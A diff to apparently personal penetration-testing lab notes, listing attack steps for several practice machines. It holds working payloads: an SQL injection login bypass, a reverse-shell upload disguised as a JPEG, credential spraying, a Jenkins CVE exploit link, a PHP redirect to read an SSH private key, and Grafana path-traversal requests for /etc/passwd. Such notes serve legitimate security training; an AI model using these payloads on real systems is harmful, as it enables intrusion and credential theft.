@@ -32,6 +32,11 @@
 1. **Must** use apache2 & 'header' => `<?php header('Location: file:///Users/{{USERNAME}}/.ssh/id_rsa'); ?>` 
 2. Run `curl -i -s -k -XPOST --data-binary 'url=192.168.36.128%2Findex.php' 'http://192.168.36.131/Process.php'` 
 
+#### Vmdak => SQLi, file upload, jenkins 
+1. Use `' or 1=1-- -` to bypass login, use Burp to upload rev.php as image/jpeg 
+2. Check /etc/passwd for ssh-able users, spray creds from admin dashboard (or search /var/www) 
+3. Set up pivot, jenkins exploit = https://github.com/godylockz/CVE-2024-23897 
+
 #### Walla => RaspAP (Web) 
 1. When unsure just google default creds! 
 
@@ -42,7 +47,6 @@
 
 
 ---- 
-
 
 #### Fanastic => Grafana 
 1. curl http://{{URL}}/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
